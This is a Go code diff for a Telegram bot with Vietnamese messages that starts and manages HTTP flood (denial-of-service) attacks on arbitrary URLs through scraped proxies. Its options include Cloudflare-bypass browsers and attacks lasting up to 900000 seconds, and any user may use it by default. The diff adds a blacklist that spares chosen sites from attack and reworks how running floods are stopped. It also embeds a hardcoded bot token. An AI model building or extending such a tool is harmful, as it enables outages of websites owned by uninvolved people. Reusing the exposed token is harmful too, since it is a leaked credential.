@@ -21,6 +21,7 @@ import (
 var BOT_TOKEN = getEnvOrDefault("BOT_TOKEN", "7983734590:AAGoDuaSDiIQ5zaDuP1XhoCd3upAnS1UNsE")
 var ALLOWED_USERS = []int64{} // Thêm Telegram User ID được phép sử dụng, để trống = cho phép tất cả
 const PROXY_FILE = "proxy.txt"
+const BLACKLIST_FILE = "blacklist.txt"
 
 // =====================================================
 
@@ -73,13 +74,15 @@ type AttackInfo struct {
 	Duration  int
 	ChatID    int64
 	UserID    int64
-	Cancel    chan struct{}
+	CancelCtx chan struct{}
 }
 
 var (
 	activeAttacks = make(map[string]*AttackInfo)
 	attacksMutex  sync.RWMutex
 	httpClient    = &http.Client{Timeout: 30 * time.Second}
+	blacklistMutex sync.RWMutex
+	blacklist      = make(map[string]bool)
 )
 
 func getEnvOrDefault(key, defaultVal string) string {
@@ -223,6 +226,81 @@ func getSystemInfo() string {
 		(usedMem/totalMem)*100, usedMem, totalMem)
 }
 
+// ==================== BLACKLIST FUNCTIONS ====================
+
+func loadBlacklist() {
+	blacklistMutex.Lock()
+	defer blacklistMutex.Unlock()
+
+	data, err := os.ReadFile(BLACKLIST_FILE)
+	if err != nil {
+		return
+	}
+
+	lines := strings.Split(string(data), "\n")
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line != "" {
+			blacklist[line] = true
+		}
+	}
+}
+
+func saveBlacklist() error {
+	blacklistMutex.RLock()
+	defer blacklistMutex.RUnlock()
+
+	var lines []string
+	for url := range blacklist {
+		lines = append(lines, url)
+	}
+
+	return os.WriteFile(BLACKLIST_FILE, []byte(strings.Join(lines, "\n")), 0644)
+}
+
+func isBlacklisted(url string) bool {
+	blacklistMutex.RLock()
+	defer blacklistMutex.RUnlock()
+	return blacklist[url]
+}
+
+func addToBlacklist(url string) {
+	blacklistMutex.Lock()
+	blacklist[url] = true
+	blacklistMutex.Unlock()
+	saveBlacklist()
+}
+
+func removeFromBlacklist(url string) bool {
+	blacklistMutex.Lock()
+	_, exists := blacklist[url]
+	if exists {
+		delete(blacklist, url)
+	}
+	blacklistMutex.Unlock()
+	saveBlacklist()
+	return exists
+}
+
+func getBlacklistCount() int {
+	blacklistMutex.RLock()
+	defer blacklistMutex.RUnlock()
+	return len(blacklist)
+}
+
+func getBlacklistItems() []string {
+	blacklistMutex.RLock()
+	defer blacklistMutex.RUnlock()
+	
+	var items []string
+	for url := range blacklist {
+		items = append(items, url)
+	}
+	return items
+}
+
+// ==================== HANDLERS ====================
+
 func handleStart(chatID int64, userID int64) {
 	if !isAllowed(userID) {
 		sendMessage(chatID, "⛔ Bạn không có quyền sử dụng bot này.", "")
@@ -239,6 +317,9 @@ func handleStart(chatID int64, userID int64) {
 /status - Xem trạng thái các cuộc tấn công
 /proxy - Xem danh sách proxy
 /getproxy - Lấy proxy mới
+/blacklist - Xem danh sách blacklist
+/blacklist_add <url> - Thêm URL vào blacklist
+/blacklist_remove <url> - Xóa URL khỏi blacklist
 /help - Xem hướng dẫn chi tiết
 
 📌 *Ví dụ nhanh:*
@@ -272,11 +353,16 @@ func handleHelp(chatID int64, userID int64) {
 • ` + "`--close`" + ` - Đóng socket khi gặp 429
 • ` + "`--browser <N>`" + ` - Max concurrent browsers (Cloudflare bypass)
 
+*Quản lý Blacklist:*
+` + "`/blacklist`" + ` - Xem danh sách
+` + "`/blacklist_add <url>`" + ` - Thêm URL
+` + "`/blacklist_remove <url>`" + ` - Xóa URL
+
 *Ví dụ:*
 ` + "```" + `
 /flood https://target.com 120 10 90
 /flood https://target.com 120 10 90 --reset --debug
-/flood https://target.com 120 10 90 --browser 5 --randpath
+/blacklist_add https://protected-site.com
 ` + "```"
 
 	sendMessage(chatID, helpMessage, "Markdown")
@@ -324,6 +410,12 @@ Cần ít nhất 4 tham số: target, time, threads, ratelimit
 		return
 	}
 
+	// Check blacklist
+	if isBlacklisted(target) {
+		sendMessage(chatID, "🚫 *URL này đã bị BLACKLIST!*\n\nKhông thể tấn công mục tiêu này.", "Markdown")
+		return
+	}
+
 	if err1 != nil || timeVal < 1 || timeVal > 900000 {
 		sendMessage(chatID, "❌ Thời gian phải từ 1-900000 giây", "")
 		return
@@ -339,40 +431,34 @@ Cần ít nhất 4 tham số: target, time, threads, ratelimit
 		return
 	}
 
-	// Tìm proxy file
-	proxyFile := PROXY_FILE
-	for i := 0; i < len(options)-1; i++ {
-		if options[i] == "--proxy" {
-			proxyFile = options[i+1]
-			options = append(options[:i], options[i+2:]...)
-			break
-		}
-	}
-
 	// Parse options
+	proxyFile := PROXY_FILE
 	debugMode := false
 	captchaMode := false
-	for _, opt := range options {
-		if opt == "--debug" {
-			debugMode = true
-		}
-		if opt == "--captcha" {
-			captchaMode = true
-		}
-	}
 
-	// Kiểm tra proxy file
-	baseDir, _ := os.Getwd()
-	proxyPath := filepath.Join(baseDir, proxyFile)
-	if _, err := os.Stat(proxyPath); os.IsNotExist(err) {
-		sendMessage(chatID, fmt.Sprintf("❌ Không tìm thấy file proxy: `%s`", proxyFile), "Markdown")
-		return
-	}
-
-	// Gửi thông báo bắt đầu
 	optionsStr := ""
 	if len(options) > 0 {
-		optionsStr = fmt.Sprintf("\n⚙️ *Options:* %s", strings.Join(options, " "))
+		optionsStr = "\n🔧 *Options:* " + strings.Join(options, " ")
+		for i := 0; i < len(options); i++ {
+			opt := options[i]
+			if opt == "--proxy" && i+1 < len(options) {
+				proxyFile = options[i+1]
+				i++
+			} else if opt == "--debug" {
+				debugMode = true
+			} else if opt == "--browser" {
+				captchaMode = true
+			}
+		}
+	}
+
+	baseDir, _ := os.Getwd()
+	proxyPath := filepath.Join(baseDir, proxyFile)
+
+	if _, err := os.Stat(proxyPath); os.IsNotExist(err) {
+		msg := fmt.Sprintf("❌ File proxy `%s` không tồn tại.\n\nDùng /getproxy để lấy proxy mới.", proxyFile)
+		sendMessage(chatID, msg, "Markdown")
+		return
 	}
 
 	startMessage := fmt.Sprintf(`🚀 *BẮT ĐẦU TẤN CÔNG*
@@ -392,13 +478,13 @@ Cần ít nhất 4 tham số: target, time, threads, ratelimit
 
 	attacksMutex.Lock()
 	activeAttacks[attackID] = &AttackInfo{
-		Process:   nil, // Không dùng process nữa
+		Process:   nil,
 		Target:    target,
 		StartTime: time.Now(),
 		Duration:  timeVal,
 		ChatID:    chatID,
 		UserID:    userID,
-		Cancel:    cancelChan,
+		CancelCtx: cancelChan,
 	}
 	attacksMutex.Unlock()
 
@@ -457,18 +543,18 @@ Cần ít nhất 4 tham số: target, time, threads, ratelimit
 		}
 	}()
 
-	// Chạy flood trong goroutine
+	// Chạy flood trong goroutine với context
 	go func() {
 		defer func() {
-			SetOutputCallback(nil) // Clear callback
+			SetOutputCallback(nil)
 			close(cancelChan)
 			attacksMutex.Lock()
 			delete(activeAttacks, attackID)
 			attacksMutex.Unlock()
 		}()
 
-		// Gọi RunFlood từ flood.go
-		RunFlood(target, timeVal, threads, ratelimit, proxyPath, debugMode, captchaMode)
+		// Gọi RunFlood với cancelChan
+		RunFloodWithContext(target, timeVal, threads, ratelimit, proxyPath, debugMode, captchaMode, cancelChan)
 
 		endMessage := fmt.Sprintf("✅ *TẤN CÔNG HOÀN TẤT*\n\n🎯 Target: `%s`", target)
 		sendMessage(chatID, endMessage, "Markdown")
@@ -483,12 +569,18 @@ func handleStop(chatID int64, userID int64) {
 
 	stoppedCount := 0
 
-	// Signal flood to stop
-	StopFlood()
-
 	attacksMutex.Lock()
 	for attackID, attack := range activeAttacks {
 		if attack.ChatID == chatID || attack.UserID == userID {
+			// Close context channel để signal stop
+			select {
+			case <-attack.CancelCtx:
+				// Already closed
+			default:
+				close(attack.CancelCtx)
+			}
+
+			// Kill process nếu có
 			if attack.Process != nil && attack.Process.Process != nil {
 				if runtime.GOOS == "windows" {
 					attack.Process.Process.Kill()
@@ -496,6 +588,7 @@ func handleStop(chatID int64, userID int64) {
 					attack.Process.Process.Signal(syscall.SIGINT)
 				}
 			}
+
 			delete(activeAttacks, attackID)
 			stoppedCount++
 		}
@@ -607,11 +700,9 @@ func handleGetProxy(chatID int64, userID int64) {
 
 	sendMessage(chatID, "🔄 Đang chạy tool lấy proxy...", "")
 
-	// Run proxy scraper in goroutine
 	go func() {
-		RunProxyScraper(true) // silent mode
+		RunProxyScraper(true)
 
-		// Read proxy file to count
 		baseDir, _ := os.Getwd()
 		proxyPath := filepath.Join(baseDir, PROXY_FILE)
 		if data, err := os.ReadFile(proxyPath); err == nil {
@@ -629,16 +720,103 @@ func handleGetProxy(chatID int64, userID int64) {
 	}()
 }
 
+func handleBlacklist(chatID int64, userID int64) {
+	if !isAllowed(userID) {
+		sendMessage(chatID, "⛔ Không có quyền.", "")
+		return
+	}
+
+	items := getBlacklistItems()
+	count := getBlacklistCount()
+
+	if count == 0 {
+		sendMessage(chatID, "📋 *Blacklist trống*\n\nChưa có URL nào bị chặn.", "Markdown")
+		return
+	}
+
+	preview := items
+	if len(preview) > 20 {
+		preview = preview[:20]
+	}
+
+	msg := fmt.Sprintf("📋 *Blacklist*\n🚫 Tổng: %d URL\n\nDanh sách:\n```\n%s\n```",
+		count, strings.Join(preview, "\n"))
+	
+	if len(items) > 20 {
+		msg += fmt.Sprintf("\n... và %d URL khác", len(items)-20)
+	}
+	
+	sendMessage(chatID, msg, "Markdown")
+}
+
+func handleBlacklistAdd(chatID int64, userID int64, argsString string) {
+	if !isAllowed(userID) {
+		sendMessage(chatID, "⛔ Không có quyền.", "")
+		return
+	}
+
+	url := strings.TrimSpace(argsString)
+	if url == "" {
+		msg := `❌ *Thiếu URL!*
+
+*Cú pháp:* ` + "`/blacklist_add <url>`" + `
+
+*Ví dụ:* ` + "`/blacklist_add https://protected-site.com`"
+		sendMessage(chatID, msg, "Markdown")
+		return
+	}
+
+	if !strings.HasPrefix(url, "https://") && !strings.HasPrefix(url, "http://") {
+		sendMessage(chatID, "❌ URL phải bắt đầu bằng `https://` hoặc `http://`", "Markdown")
+		return
+	}
+
+	if isBlacklisted(url) {
+		sendMessage(chatID, fmt.Sprintf("ℹ️ URL `%s` đã có trong blacklist rồi.", url), "Markdown")
+		return
+	}
+
+	addToBlacklist(url)
+	count := getBlacklistCount()
+	
+	msg := fmt.Sprintf("✅ *Đã thêm vào blacklist!*\n\n🚫 URL: `%s`\n📊 Tổng: %d URL", url, count)
+	sendMessage(chatID, msg, "Markdown")
+}
+
+func handleBlacklistRemove(chatID int64, userID int64, argsString string) {
+	if !isAllowed(userID) {
+		sendMessage(chatID, "⛔ Không có quyền.", "")
+		return
+	}
+
+	url := strings.TrimSpace(argsString)
+	if url == "" {
+		msg := `❌ *Thiếu URL!*
+
+*Cú pháp:* ` + "`/blacklist_remove <url>`" + `
+
+*Ví dụ:* ` + "`/blacklist_remove https://protected-site.com`"
+		sendMessage(chatID, msg, "Markdown")
+		return
+	}
+
+	if removeFromBlacklist(url) {
+		count := getBlacklistCount()
+		msg := fmt.Sprintf("✅ *Đã xóa khỏi blacklist!*\n\n🔓 URL: `%s`\n📊 Còn lại: %d URL", url, count)
+		sendMessage(chatID, msg, "Markdown")
+	} else {
+		sendMessage(chatID, fmt.Sprintf("❌ URL `%s` không có trong blacklist.", url), "Markdown")
+	}
+}
+
 func startProxyScraper() {
 	runScraper := func() {
 		fmt.Println("[SYSTEM] Đang cập nhật proxy list (Background)...")
-		go RunProxyScraper(true) // silent mode in goroutine
+		go RunProxyScraper(true)
 	}
 
-	// Chạy ngay lập tức
 	runScraper()
 
-	// Chạy định kỳ mỗi 10 phút
 	go func() {
 		ticker := time.NewTicker(10 * time.Minute)
 		for range ticker.C {
@@ -673,6 +851,17 @@ func handleMessage(msg *Message) {
 	case strings.HasPrefix(text, "/status"):
 		handleStatus(chatID, userID)
 
+	case strings.HasPrefix(text, "/blacklist_add"):
+		argsString := strings.TrimPrefix(text, "/blacklist_add")
+		handleBlacklistAdd(chatID, userID, argsString)
+
+	case strings.HasPrefix(text, "/blacklist_remove"):
+		argsString := strings.TrimPrefix(text, "/blacklist_remove")
+		handleBlacklistRemove(chatID, userID, argsString)
+
+	case strings.HasPrefix(text, "/blacklist"):
+		handleBlacklist(chatID, userID)
+
 	case strings.HasPrefix(text, "/proxy") && !strings.HasPrefix(text, "/getproxy"):
 		handleProxy(chatID, userID)
 
@@ -684,6 +873,10 @@ func handleMessage(msg *Message) {
 func main() {
 	fmt.Println("🤖 Telegram Bot đã khởi động!")
 	fmt.Println("📌 Sử dụng /start để bắt đầu")
+
+	// Load blacklist
+	loadBlacklist()
+	fmt.Printf("📋 Đã load %d URL từ blacklist\n", getBlacklistCount())
 
 	startProxyScraper()
 
